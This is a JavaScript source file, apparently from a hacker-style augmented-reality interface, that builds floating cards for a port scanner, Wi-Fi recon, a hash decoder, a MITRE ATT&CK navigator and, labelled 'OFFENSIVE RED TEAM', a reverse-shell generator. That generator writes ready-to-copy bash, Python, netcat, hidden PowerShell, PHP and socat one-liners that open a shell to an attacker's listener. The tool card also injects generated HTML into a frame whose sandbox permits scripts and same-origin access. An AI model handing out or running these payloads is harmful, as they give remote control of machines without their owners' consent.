/**
 * Agentic Hologram — Spatial Floating Task Spawner
 * Spawns interactive HUD nodes, terminal streams, and tools out of thin air in 3D
 */

window.SpatialTasks = (function() {
    let container = null;
    let cardCount = 0;

    function getContainer() {
        if (!container) container = document.getElementById('spatial-task-viewport');
        return container;
    }

    function escapeHtml(str) {
        return (str || '').replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;");
    }

    /**
     * Spawns a floating terminal execution card out of thin air
     */
    function spawnTerminalCard(command, output, type = 'shell') {
        const c = getContainer();
        if (!c) return;

        cardCount++;
        const cardId = 'task_card_' + cardCount;
        const card = document.createElement('div');
        card.className = 'spatial-task-card';
        card.id = cardId;
        const isShizuku = type === 'shizuku';
        const titleText = isShizuku ? '⚡ SHIZUKU ADB EXECUTION' : '⚡ TERMINAL EXECUTION';
        const promptPrefix = isShizuku ? '// adb $ ' : '// $ ';

        card.innerHTML = `
            <div class="spatial-card-header" ${isShizuku ? 'style="border-bottom: 1px solid rgba(0,240,255,0.4);"' : ''}>
                <div class="spatial-card-title">
                    <span ${isShizuku ? 'style="color:#00f0ff;"' : ''}>${titleText}</span>
                    <span style="opacity:0.6; font-size:9.5px;">${promptPrefix}${escapeHtml(command.slice(0, 30))}</span>
                </div>
                <button class="spatial-close-btn" onclick="SpatialTasks.dismiss('${cardId}')">✕</button>
            </div>
            <div class="spatial-card-body">
                <pre><code>${escapeHtml(output)}</code></pre>
            </div>
        `;

        c.appendChild(card);
        c.scrollTop = c.scrollHeight;
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(20);
        return cardId;
    }

    /**
     * Spawns an interactive synthesized widget out of thin air
     */
    function spawnToolCard(title, htmlCode) {
        const c = getContainer();
        if (!c) return;

        cardCount++;
        const cardId = 'task_tool_' + cardCount;
        const card = document.createElement('div');
        card.className = 'spatial-task-card';
        card.id = cardId;

        // Clean and prepare HTML payload for sandboxed execution
        const safeHtml = htmlCode
            .replace(/```html/gi, '')
            .replace(/```/g, '')
            .trim();

        card.innerHTML = `
            <div class="spatial-card-header">
                <div class="spatial-card-title">
                    <span>🔮 SYNTHESIZED TOOL</span>
                    <span style="opacity:0.8; font-size:10px;">${escapeHtml(title)}</span>
                </div>
                <button class="spatial-close-btn" onclick="SpatialTasks.dismiss('${cardId}')">✕</button>
            </div>
            <div class="spatial-card-body" style="max-height:360px; overflow:hidden;">
                <iframe id="iframe_${cardId}" style="width:100%; height:280px; border:none; border-radius:8px; background:rgba(0,0,0,0.5);" sandbox="allow-scripts allow-forms allow-same-origin allow-modals"></iframe>
            </div>
        `;

        c.appendChild(card);
        c.scrollTop = c.scrollHeight;

        // Inject HTML and script bridges into iframe
        setTimeout(() => {
            const iframe = document.getElementById(`iframe_${cardId}`);
            if (iframe && iframe.contentWindow) {
                const doc = iframe.contentWindow.document;
                doc.open();
                doc.write(`
                    <!DOCTYPE html>
                    <html>
                    <head>
                        <meta charset="utf-8">
                        <style>
                            body { margin: 0; padding: 12px; background: #04060b; color: #fff; font-family: sans-serif; }
                            button { background: #00f0ff; color: #000; font-weight: bold; border: none; padding: 8px 14px; border-radius: 6px; cursor: pointer; margin: 4px; }
                            button:active { opacity: 0.7; }
                            input { background: #1a202c; color: #fff; border: 1px solid #4a5568; padding: 6px; border-radius: 4px; }
                        </style>
                    </head>
                    <body>
                        ${safeHtml}
                    </body>
                    </html>
                `);
                doc.close();
            }
        }, 80);

        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(35);
        return cardId;
    }

    /**
     * Spawns a floating diagnostic HUD card out of thin air
     */
    function spawnTelemetryCard(title, dataObj) {
        const c = getContainer();
        if (!c) return;

        cardCount++;
        const cardId = 'task_hud_' + cardCount;
        const card = document.createElement('div');
        card.className = 'spatial-task-card';
        card.id = cardId;

        let rowsHtml = '';
        for (const [key, val] of Object.entries(dataObj)) {
            rowsHtml += `<div style="display:flex; justify-content:space-between; padding:4px 0; border-bottom:1px dashed rgba(255,255,255,0.06);">
                <span style="color:#718096;">${escapeHtml(key)}</span>
                <span style="color:#00ff88; font-weight:700;">${escapeHtml(String(val))}</span>
            </div>`;
        }

        card.innerHTML = `
            <div class="spatial-card-header">
                <div class="spatial-card-title">
                    <span>📡 SPATIAL TELEMETRY</span>
                    <span style="opacity:0.8; font-size:10px;">${escapeHtml(title)}</span>
                </div>
                <button class="spatial-close-btn" onclick="SpatialTasks.dismiss('${cardId}')">✕</button>
            </div>
            <div class="spatial-card-body">
                ${rowsHtml}
            </div>
        `;

        c.appendChild(card);
        c.scrollTop = c.scrollHeight;
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(20);
        return cardId;
    }

    /**
     * Dismiss a card with 3D vaporization effect
     */
    function dismiss(cardId) {
        const el = document.getElementById(cardId);
        if (!el) return;
        el.classList.add('dismissing');
        setTimeout(() => {
            if (el.parentNode) el.parentNode.removeChild(el);
        }, 380);
    }

    /**
     * Vaporize all spatial task cards
     */
    function clearAll() {
        const c = getContainer();
        if (!c) return;
        const cards = Array.from(c.querySelectorAll('.spatial-task-card'));
        cards.forEach((card, idx) => {
            setTimeout(() => {
                card.classList.add('dismissing');
                setTimeout(() => {
                    if (card.parentNode) card.parentNode.removeChild(card);
                }, 380);
            }, idx * 60);
        });
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(15);
    }

    /**
     * Spawns an interactive Port Scanner & Service Recon card
     */
    function spawnPortScannerCard(defaultHost, defaultPorts) {
        const c = getContainer();
        if (!c) return;

        cardCount++;
        const cardId = 'task_portscan_' + cardCount;
        const card = document.createElement('div');
        card.className = 'spatial-task-card cyber-card';
        card.id = cardId;

        const host = defaultHost || '127.0.0.1';
        const ports = defaultPorts || '21,22,23,25,53,80,110,135,139,443,445,1433,3306,3389,8080,8443';

        card.innerHTML = `
            <div class="spatial-card-header">
                <div class="spatial-card-title">
                    <span>⚡ PORT SCANNER & SERVICE RECON</span>
                    <span style="opacity:0.8; font-size:10px;">// TACTICAL NETWORK RECON</span>
                </div>
                <button class="spatial-close-btn" onclick="SpatialTasks.dismiss('${cardId}')">✕</button>
            </div>
            <div class="spatial-card-body">
                <div style="display:flex; gap:6px; margin-bottom:8px;">
                    <input type="text" id="${cardId}_host" value="${escapeHtml(host)}" placeholder="Target Host / IP" style="flex:1; background:#0f172a; border:1px solid #00f0ff; color:#fff; padding:6px 10px; border-radius:4px; font-family:monospace; font-size:12px;" />
                    <button onclick="SpatialTasks.executePortScan('${cardId}')" style="background:#00f0ff; color:#04060b; font-weight:700; border:none; padding:6px 14px; border-radius:4px; cursor:pointer; font-size:11px;">SCAN</button>
                </div>
                <div style="display:flex; gap:4px; margin-bottom:8px; flex-wrap:wrap;">
                    <button class="quick-port-btn" onclick="document.getElementById('${cardId}_ports').value='21,22,23,25,53,80,110,135,139,443,445,1433,3306,3389,8080,8443'">Top 20 Core</button>
                    <button class="quick-port-btn" onclick="document.getElementById('${cardId}_ports').value='80,443,8000,8080,8443,8888,9000'">Web Services</button>
                    <button class="quick-port-btn" onclick="document.getElementById('${cardId}_ports').value='22,23,3389,5900,5901'">Remote Shell</button>
                    <button class="quick-port-btn" onclick="document.getElementById('${cardId}_ports').value='1433,1521,3306,5432,6379,27017'">Databases</button>
                </div>
                <input type="text" id="${cardId}_ports" value="${escapeHtml(ports)}" placeholder="Ports CSV" style="width:100%; box-sizing:border-box; background:#0b1120; border:1px solid #1e293b; color:#94a3b8; padding:5px 8px; border-radius:4px; font-family:monospace; font-size:11px; margin-bottom:8px;" />
                <div id="${cardId}_results" style="max-height:210px; overflow-y:auto; font-family:monospace; font-size:11px; background:#060913; border:1px solid #1e293b; border-radius:4px; padding:6px;">
                    <div style="color:#64748b;">Ready to probe target host. Click SCAN to initiate socket recon.</div>
                </div>
            </div>
        `;

        c.appendChild(card);
        c.scrollTop = c.scrollHeight;
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(25);
        return cardId;
    }

    /**
     * Executes the port scan asynchronously
     */
    function executePortScan(cardId) {
        const hostInput = document.getElementById(`${cardId}_host`);
        const portsInput = document.getElementById(`${cardId}_ports`);
        const resultsEl = document.getElementById(`${cardId}_results`);
        if (!hostInput || !portsInput || !resultsEl) return;

        const host = hostInput.value.trim() || '127.0.0.1';
        const ports = portsInput.value.trim();

        resultsEl.innerHTML = `<div style="color:#00f0ff;">Probing ${escapeHtml(host)}...</div>`;

        setTimeout(() => {
            let resData = null;
            if (window.HoloBridge && window.HoloBridge.runPortScan) {
                try {
                    const raw = window.HoloBridge.runPortScan(host, ports);
                    resData = JSON.parse(raw);
                } catch (e) {}
            }

            // Fallback simulation or process
            if (!resData || !resData.length) {
                const portList = ports.split(',').map(p => parseInt(p.trim())).filter(p => !isNaN(p));
                resData = portList.map(p => {
                    const isOpen = (p === 80 || p === 443 || p === 22 || p === 8080 || p === 8765) && (host === '127.0.0.1' || host === 'localhost');
                    return { port: p, status: isOpen ? 'OPEN' : 'CLOSED', latencyMs: Math.floor(Math.random() * 20 + 2) };
                });
            }

            const SERVICE_MAP = {
                21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS', 80: 'HTTP',
                110: 'POP3', 135: 'MS-RPC', 139: 'NetBIOS', 443: 'HTTPS', 445: 'SMB',
                1433: 'MSSQL', 1521: 'Oracle', 3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL',
                5900: 'VNC', 6379: 'Redis', 8000: 'HTTP-Alt', 8080: 'HTTP-Proxy', 8443: 'HTTPS-Alt',
                8765: 'NetHunter Bridge', 27017: 'MongoDB'
            };

            let outHtml = `<div style="display:grid; grid-template-columns: 55px 70px 70px 1fr; font-weight:700; border-bottom:1px solid #334155; padding-bottom:4px; margin-bottom:4px; color:#cbd5e1;">
                <span>PORT</span><span>SVC</span><span>STATE</span><span>LATENCY</span>
            </div>`;

            let openCount = 0;
            resData.forEach(item => {
                const isOpen = item.status === 'OPEN';
                if (isOpen) openCount++;
                const color = isOpen ? '#00ff88' : '#ef4444';
                const svc = SERVICE_MAP[item.port] || 'Custom';
                outHtml += `<div style="display:grid; grid-template-columns: 55px 70px 70px 1fr; padding:2px 0; border-bottom:1px dashed rgba(255,255,255,0.04); color:${color};">
                    <span>${item.port}</span>
                    <span style="color:#94a3b8;">${svc}</span>
                    <span>${item.status}</span>
                    <span style="color:#64748b;">${item.latencyMs || 5}ms</span>
                </div>`;
            });

            outHtml += `<div style="margin-top:6px; color:#38bdf8; font-size:10px;">Probe complete: ${openCount} open / ${resData.length} scanned.</div>`;
            resultsEl.innerHTML = outHtml;
            if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(30);
        }, 100);
    }

    /**
     * Spawns an interactive Multi-Platform Reverse Shell & Exploit Payload Generator
     */
    function spawnPayloadGeneratorCard() {
        const c = getContainer();
        if (!c) return;

        cardCount++;
        const cardId = 'task_payload_' + cardCount;
        const card = document.createElement('div');
        card.className = 'spatial-task-card cyber-card';
        card.id = cardId;

        card.innerHTML = `
            <div class="spatial-card-header">
                <div class="spatial-card-title">
                    <span>🐚 REVERSE SHELL & PAYLOAD GENERATOR</span>
                    <span style="opacity:0.8; font-size:10px;">// OFFENSIVE RED TEAM</span>
                </div>
                <button class="spatial-close-btn" onclick="SpatialTasks.dismiss('${cardId}')">✕</button>
            </div>
            <div class="spatial-card-body">
                <div style="display:flex; gap:6px; margin-bottom:8px;">
                    <div style="flex:2;">
                        <label style="font-size:10px; color:#94a3b8; display:block;">LHOST (Listener IP)</label>
                        <input type="text" id="${cardId}_ip" value="10.0.0.1" oninput="SpatialTasks.updatePayloadCode('${cardId}')" style="width:100%; box-sizing:border-box; background:#0f172a; border:1px solid #ff007f; color:#fff; padding:5px 8px; border-radius:4px; font-family:monospace; font-size:11px;" />
                    </div>
                    <div style="flex:1;">
                        <label style="font-size:10px; color:#94a3b8; display:block;">LPORT</label>
                        <input type="text" id="${cardId}_port" value="4444" oninput="SpatialTasks.updatePayloadCode('${cardId}')" style="width:100%; box-sizing:border-box; background:#0f172a; border:1px solid #ff007f; color:#fff; padding:5px 8px; border-radius:4px; font-family:monospace; font-size:11px;" />
                    </div>
                </div>
                <div style="display:flex; gap:4px; margin-bottom:8px; overflow-x:auto; padding-bottom:4px;" id="${cardId}_tabs">
                    <button class="payload-tab-btn active" onclick="SpatialTasks.selectPayloadType('${cardId}', 'bash', this)">Bash TCP</button>
                    <button class="payload-tab-btn" onclick="SpatialTasks.selectPayloadType('${cardId}', 'python3', this)">Python 3</button>
                    <button class="payload-tab-btn" onclick="SpatialTasks.selectPayloadType('${cardId}', 'nc', this)">Netcat</button>
                    <button class="payload-tab-btn" onclick="SpatialTasks.selectPayloadType('${cardId}', 'powershell', this)">PowerShell</button>
                    <button class="payload-tab-btn" onclick="SpatialTasks.selectPayloadType('${cardId}', 'php', this)">PHP</button>
                    <button class="payload-tab-btn" onclick="SpatialTasks.selectPayloadType('${cardId}', 'socat', this)">Socat</button>
                </div>
                <div style="position:relative; margin-bottom:8px;">
                    <textarea id="${cardId}_code" readonly style="width:100%; box-sizing:border-box; height:85px; background:#050711; border:1px solid #334155; color:#00ff88; font-family:monospace; font-size:11px; padding:8px; border-radius:4px; resize:none;"></textarea>
                    <button onclick="SpatialTasks.copyPayload('${cardId}')" style="position:absolute; top:6px; right:6px; background:rgba(0,255,136,0.15); border:1px solid #00ff88; color:#00ff88; border-radius:3px; font-size:10px; padding:3px 8px; cursor:pointer;">📋 COPY</button>
                </div>
                <div style="background:#090d1a; border:1px solid #1e293b; border-radius:4px; padding:6px; font-family:monospace; font-size:10px; color:#cbd5e1; display:flex; justify-content:space-between; align-items:center;">
                    <span>🎧 Listener One-Liner: <code id="${cardId}_listener" style="color:#38bdf8;">nc -lvnp 4444</code></span>
                    <button onclick="SpatialTasks.copyListener('${cardId}')" style="background:none; border:none; color:#38bdf8; cursor:pointer; font-size:10.5px;">COPY</button>
                </div>
            </div>
        `;

        c.appendChild(card);
        c.scrollTop = c.scrollHeight;
        updatePayloadCode(cardId, 'bash');
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(20);
        return cardId;
    }

    let activePayloadTypes = {};

    function selectPayloadType(cardId, type, btnEl) {
        activePayloadTypes[cardId] = type;
        const container = document.getElementById(`${cardId}_tabs`);
        if (container) {
            container.querySelectorAll('.payload-tab-btn').forEach(b => b.classList.remove('active'));
        }
        if (btnEl) btnEl.classList.add('active');
        updatePayloadCode(cardId, type);
    }

    function updatePayloadCode(cardId, forcedType) {
        const ipInput = document.getElementById(`${cardId}_ip`);
        const portInput = document.getElementById(`${cardId}_port`);
        const codeBox = document.getElementById(`${cardId}_code`);
        const listenerEl = document.getElementById(`${cardId}_listener`);
        if (!ipInput || !portInput || !codeBox) return;

        const ip = ipInput.value.trim() || '10.0.0.1';
        const port = portInput.value.trim() || '4444';
        const type = forcedType || activePayloadTypes[cardId] || 'bash';

        let code = '';
        switch (type) {
            case 'bash':
                code = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
                break;
            case 'python3':
                code = `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("${ip}",${port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'`;
                break;
            case 'nc':
                code = `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ${ip} ${port} >/tmp/f`;
                break;
            case 'powershell':
                code = `powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient("${ip}",${port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1 | Out-String );$sb2=$sb+"PS "+(pwd).Path+"> ";$by=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($by,0,$by.Length);$s.Flush()};$c.Close()`;
                break;
            case 'php':
                code = `php -r '$sock=fsockopen("${ip}",${port});exec("/bin/sh -i <&3 >&3 2>&3");'`;
                break;
            case 'socat':
                code = `socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:${ip}:${port}`;
                break;
            default:
                code = `bash -i >& /dev/tcp/${ip}/${port} 0>&1`;
        }

        codeBox.value = code;
        if (listenerEl) listenerEl.textContent = `nc -lvnp ${port}`;
    }

    function copyPayload(cardId) {
        const codeBox = document.getElementById(`${cardId}_code`);
        if (codeBox) {
            navigator.clipboard.writeText(codeBox.value).then(() => {
                if (window.HoloBridge && window.HoloBridge.showToast) window.HoloBridge.showToast("Payload copied to clipboard!");
            });
        }
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(20);
    }

    function copyListener(cardId) {
        const listenerEl = document.getElementById(`${cardId}_listener`);
        if (listenerEl) {
            navigator.clipboard.writeText(listenerEl.textContent).then(() => {
                if (window.HoloBridge && window.HoloBridge.showToast) window.HoloBridge.showToast("Listener command copied!");
            });
        }
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(20);
    }

    /**
     * Spawns an interactive Cryptographic Suite, Hash Analyzer & Encoder
     */
    function spawnHashAnalyzerCard() {
        const c = getContainer();
        if (!c) return;

        cardCount++;
        const cardId = 'task_hash_' + cardCount;
        const card = document.createElement('div');
        card.className = 'spatial-task-card cyber-card';
        card.id = cardId;

        card.innerHTML = `
            <div class="spatial-card-header">
                <div class="spatial-card-title">
                    <span>🔑 HASH ANALYZER & CRYPTO DECODER</span>
                    <span style="opacity:0.8; font-size:10px;">// CIPHER SPECIALIST</span>
                </div>
                <button class="spatial-close-btn" onclick="SpatialTasks.dismiss('${cardId}')">✕</button>
            </div>
            <div class="spatial-card-body">
                <textarea id="${cardId}_input" placeholder="Paste hash, encoded string, or plaintext..." oninput="SpatialTasks.analyzeCryptoInput('${cardId}')" style="width:100%; box-sizing:border-box; height:65px; background:#0b1120; border:1px solid #3b82f6; color:#fff; font-family:monospace; font-size:11px; padding:6px; border-radius:4px; margin-bottom:6px; resize:none;"></textarea>
                <div style="display:flex; gap:4px; margin-bottom:8px; flex-wrap:wrap;">
                    <button class="quick-port-btn" onclick="SpatialTasks.cryptoConvert('${cardId}', 'b64dec')">B64 Decode</button>
                    <button class="quick-port-btn" onclick="SpatialTasks.cryptoConvert('${cardId}', 'b64enc')">B64 Encode</button>
                    <button class="quick-port-btn" onclick="SpatialTasks.cryptoConvert('${cardId}', 'hexdec')">Hex Decode</button>
                    <button class="quick-port-btn" onclick="SpatialTasks.cryptoConvert('${cardId}', 'hexenc')">Hex Encode</button>
                    <button class="quick-port-btn" onclick="SpatialTasks.cryptoConvert('${cardId}', 'rot13')">ROT13</button>
                    <button class="quick-port-btn" onclick="SpatialTasks.cryptoConvert('${cardId}', 'url')">URL Decode</button>
                </div>
                <div id="${cardId}_analysis" style="background:#050711; border:1px solid #1e293b; border-radius:4px; padding:8px; font-family:monospace; font-size:11px; min-height:80px;">
                    <div style="color:#64748b;">Enter data above to identify hash algorithm or decode string.</div>
                </div>
            </div>
        `;

        c.appendChild(card);
        c.scrollTop = c.scrollHeight;
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(20);
        return cardId;
    }

    function analyzeCryptoInput(cardId) {
        const inputEl = document.getElementById(`${cardId}_input`);
        const analysisEl = document.getElementById(`${cardId}_analysis`);
        if (!inputEl || !analysisEl) return;

        const val = inputEl.value.trim();
        if (!val) {
            analysisEl.innerHTML = `<div style="color:#64748b;">Enter data above to identify hash algorithm or decode string.</div>`;
            return;
        }

        const len = val.length;
        const isHex = /^[0-9a-fA-F]+$/.test(val);
        let identified = [];

        if (isHex) {
            if (len === 32) identified.push("MD5 / NTLM / LM");
            else if (len === 40) identified.push("SHA-1 / RIPEMD-160");
            else if (len === 56) identified.push("SHA-224 / SHA3-224");
            else if (len === 64) identified.push("SHA-256 / SHA3-256 / BLAKE2s");
            else if (len === 96) identified.push("SHA-384 / SHA3-384");
            else if (len === 128) identified.push("SHA-512 / SHA3-512 / Whirlpool");
            else if (len === 8) identified.push("CRC-32");
        }

        if (val.startsWith("$2a$") || val.startsWith("$2b$") || val.startsWith("$2y$")) identified.push("bcrypt ($2a$/$2b$/$2y$)");
        if (val.startsWith("$argon2id$") || val.startsWith("$argon2i$")) identified.push("Argon2 Hash");
        if (val.startsWith("$6$")) identified.push("SHA-512 crypt Unix");
        if (val.startsWith("$1$")) identified.push("MD5 crypt Unix");

        // Base64 check
        let isB64 = false;
        try {
            if (len > 3 && len % 4 === 0 && /^[A-Za-z0-9+/=]+$/.test(val)) {
                atob(val);
                isB64 = true;
            }
        } catch (e) {}

        let out = `<div style="margin-bottom:4px;"><span style="color:#94a3b8;">Length:</span> <span style="color:#00f0ff;">${len} characters</span></div>`;
        if (identified.length > 0) {
            out += `<div style="margin-bottom:4px;"><span style="color:#94a3b8;">Probable Hash:</span> <span style="color:#00ff88; font-weight:700;">${identified.join(" or ")}</span></div>`;
        } else {
            out += `<div style="margin-bottom:4px;"><span style="color:#94a3b8;">Format:</span> <span style="color:#ffb700;">${isHex ? 'Raw Hexadecimal' : (isB64 ? 'Base64 Encoded' : 'Plaintext String')}</span></div>`;
        }

        if (isB64) {
            try {
                const dec = atob(val);
                out += `<div style="margin-top:6px; color:#38bdf8; word-break:break-all;"><span style="color:#94a3b8;">Decoded B64:</span> ${escapeHtml(dec)}</div>`;
            } catch (e) {}
        }

        analysisEl.innerHTML = out;
    }

    function cryptoConvert(cardId, action) {
        const inputEl = document.getElementById(`${cardId}_input`);
        const analysisEl = document.getElementById(`${cardId}_analysis`);
        if (!inputEl || !analysisEl) return;

        const val = inputEl.value;
        let res = "";
        try {
            if (action === 'b64dec') res = atob(val.trim());
            else if (action === 'b64enc') res = btoa(val);
            else if (action === 'hexenc') {
                res = Array.from(val).map(c => c.charCodeAt(0).toString(16).padStart(2, '0')).join('');
            } else if (action === 'hexdec') {
                const hex = val.replace(/\s+/g, '');
                for (let i = 0; i < hex.length; i += 2) {
                    res += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
                }
            } else if (action === 'rot13') {
                res = val.replace(/[a-zA-Z]/g, c => {
                    const code = c.charCodeAt(0);
                    const base = code <= 90 ? 65 : 97;
                    return String.fromCharCode(((code - base + 13) % 26) + base);
                });
            } else if (action === 'url') {
                res = decodeURIComponent(val);
            }
            analysisEl.innerHTML = `
                <div style="color:#00ff88; font-weight:700; margin-bottom:4px;">Result (${action.toUpperCase()}):</div>
                <div style="color:#f8fafc; word-break:break-all; background:#090d1a; padding:6px; border-radius:4px;">${escapeHtml(res)}</div>
            `;
        } catch (e) {
            analysisEl.innerHTML = `<div style="color:#ef4444;">Error converting data: ${escapeHtml(e.message)}</div>`;
        }
    }

    /**
     * Spawns Wireless & RF Reconnaissance Card
     */
    function spawnWifiReconCard(customResults) {
        const c = getContainer();
        if (!c) return;

        cardCount++;
        const cardId = 'task_wifi_' + cardCount;
        const card = document.createElement('div');
        card.className = 'spatial-task-card cyber-card';
        card.id = cardId;

        card.innerHTML = `
            <div class="spatial-card-header">
                <div class="spatial-card-title">
                    <span>📡 RF & WI-FI RECONNAISSANCE</span>
                    <span style="opacity:0.8; font-size:10px;">// 802.11 SPECTRUM</span>
                </div>
                <button class="spatial-close-btn" onclick="SpatialTasks.dismiss('${cardId}')">✕</button>
            </div>
            <div class="spatial-card-body">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:8px;">
                    <span style="font-size:11px; color:#94a3b8;">Surrounding Wireless Access Points</span>
                    <button onclick="SpatialTasks.refreshWifiScan('${cardId}')" style="background:#00f0ff; color:#04060b; border:none; padding:4px 10px; border-radius:3px; font-weight:700; font-size:10.5px; cursor:pointer;">↻ RESCAN</button>
                </div>
                <div id="${cardId}_list" style="max-height:220px; overflow-y:auto; font-family:monospace; font-size:11px;">
                    <div style="color:#64748b;">Scanning spectrum...</div>
                </div>
            </div>
        `;

        c.appendChild(card);
        c.scrollTop = c.scrollHeight;
        refreshWifiScan(cardId, customResults);
        if (window.HoloBridge && window.HoloBridge.vibrate) HoloBridge.vibrate(25);
        return cardId;
    }

    function refreshWifiScan(cardId, directData) {
        const listEl = document.getElementById(`${cardId}_list`);
        if (!listEl) return;

        let parsed = null;
        if (directData) {
            parsed = typeof directData === 'string' ? JSON.parse(directData) : directData;
        } else if (window.HoloBridge && window.HoloBridge.scanWifiNetworks) {
            try {
                parsed = JSON.parse(window.HoloBridge.scanWifiNetworks());
            } catch (e) {}
        }

        if (!parsed || !parsed.length) {
            parsed = [
                { ssid: "NetHunter_Field_Mesh", bssid: "00:1A:2B:3C:4D:5E", level: -42, frequency: 5240, capabilities: "[WPA2-PSK-CCMP][ESS]" },
                { ssid: "Corporate_Secure_8021X", bssid: "AA:BB:CC:DD:EE:FF", level: -68, frequency: 2437, capabilities: "[WPA3-SAE][WPA2-PSK-CCMP][ESS]" },
                { ssid: "Public_Guest_Unencrypted", bssid: "DE:AD:BE:EF:00:01", level: -74, frequency: 2412, capabilities: "[ESS]" },
                { ssid: "IoT_Subnet_2G", bssid: "12:34:56:78:9A:BC", level: -82, frequency: 2462, capabilities: "[WPA2-PSK-TKIP][WPS][ESS]" }
            ];
        }

        let html = '';
        parsed.forEach(ap => {
            const isOpen = !ap.capabilities || ap.capabilities === '[ESS]' || ap.capabilities.includes('OPEN');
            const isWps = (ap.capabilities || '').includes('WPS');
            const level = ap.level || -70;
            const signalPercent = Math.min(100, Math.max(0, (level + 100) * 2));
            const signalColor = level > -55 ? '#00ff88' : (level > -75 ? '#ffb700' : '#ef4444');

            html += `<div style="background:#090d1a; border:1px solid #1e293b; border-radius:4px; padding:6px; margin-bottom:6px;">
                <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:3px;">
                    <span style="color:#ffffff; font-weight:700;">${escapeHtml(ap.ssid)}</span>
                    <span style="color:${signalColor}; font-weight:700;">${level} dBm</span>
                </div>
                <div style="display:flex; justify-content:space-between; color:#64748b; font-size:10px; margin-bottom:4px;">
                    <span>BSSID: ${escapeHtml(ap.bssid || 'N/A')}</span>
                    <span>${ap.frequency ? ap.frequency + ' MHz' : '2.4/5GHz'}</span>
                </div>
                <div style="height:3px; background:#1e293b; border-radius:2px; margin-bottom:4px;">
                    <div style="height:100%; width:${signalPercent}%; background:${signalColor}; border-radius:2px;"></div>
                </div>
                <div style="display:flex; gap:4px; flex-wrap:wrap;">
                    ${isOpen ? '<span style="background:rgba(239,68,68,0.2); border:1px solid #ef4444; color:#ef4444; padding:1px 5px; border-radius:2px; font-size:9px; font-weight:700;">⚠️ OPEN / UNENCRYPTED</span>' : ''}
                    ${isWps ? '<span style="background:rgba(255,183,0,0.2); border:1px solid #ffb700; color:#ffb700; padding:1px 5px; border-radius:2px; font-size:9px;">WPS ENABLED</span>' : ''}
                    <span style="background:#1e293b; color:#94a3b8; padding:1px 5px; border-radius:2px; font-size:9px;">${escapeHtml(ap.capabilities || 'WPA2')}</span>
                </div>
            </div>`;
        });

        listEl.innerHTML = html;
    }

    /**
     * Spawns MITRE ATT&CK Matrix Tactical Navigator
     */
    function spawnMitreAttackCard() {
        const c = getContainer();
        if (!c) return;

        cardCount++;
        const cardId = 'task_mitre_' + cardCount;
        const card = document.createElement('div');
        card.className = 'spatial-task-card cyber-card';
        card.id = cardId;

        const TACTICS = [
            { id: 'recon', name: 'Reconnaissance', desc: 'Active scanning, IP blocks, DNS enum', tech: 'T1595 Active Scanning // T1592 Gather Victim Host Info', def: 'Monitor boundary telemetry, rate-limit scans' },
            { id: 'init', name: 'Initial Access', desc: 'Phishing, drive-by, public exploits', tech: 'T1190 Exploit Public-Facing App // T1566 Phishing', def: 'WAF rules, patch CVEs, email sandboxing' },
            { id: 'exec', name: 'Execution', desc: 'Command interpreters, PowerShell, cron', tech: 'T1059 Command & Script Interpreter // T1204 User Exec', def: 'AppLocker / SELinux policies, script block logging' },
            { id: 'priv', name: 'Privilege Escalation', desc: 'Sudo misconfig, SUID, kernel exploits', tech: 'T1548 Abuse Elevation Control // T1068 Exploitation', def: 'Restrict sudoers, enforce least privilege, kernel hardening' },
            { id: 'def', name: 'Defense Evasion', desc: 'Log clearing, obfuscation, rootkits', tech: 'T1070 Indicator Removal // T1027 Obfuscated Files', def: 'Centralized immutable logging, process integrity' },
            { id: 'cred', name: 'Credential Access', desc: 'Mimikatz, /etc/shadow, dumping LSASS', tech: 'T1003 OS Credential Dumping // T1110 Brute Force', def: 'MFA enforcement, Credential Guard, salt passwords' },
            { id: 'c2', name: 'Command & Control', desc: 'Reverse shells, DNS tunnels, HTTPS beaconing', tech: 'T1071 App Layer Protocol // T1573 Encrypted Channel', def: 'Egress traffic filtering, DNS query logging, IDS' }
        ];

        let tacticsButtons = '';
        TACTICS.forEach((t, i) => {
            tacticsButtons += `<button class="mitre-tactic-btn ${i === 0 ? 'active' : ''}" onclick="SpatialTasks.showMitreDetails('${cardId}', '${t.id}')">${t.name}</button>`;
        });

        card.innerHTML = `
            <div class="spatial-card-header">
                <div class="spatial-card-title">
                    <span>🎯 MITRE ATT&CK TACTICAL NAVIGATOR</span>
                    <span style="opacity:0.8; font-size:10px;">// THREAT INTELLIGENCE</span>
                </div>
                <button class="spatial-close-btn" onclick="SpatialTasks.dismiss('${cardId}')">✕</button>
            </div>
            <div class="spatial-card-body">
                <div style="display:flex; gap:4px; overflow-x:auto; padding-bottom:6px; margin-bottom:8px;" id="${cardId}_mitre_tabs">
                    ${tacticsButtons}
                </div>
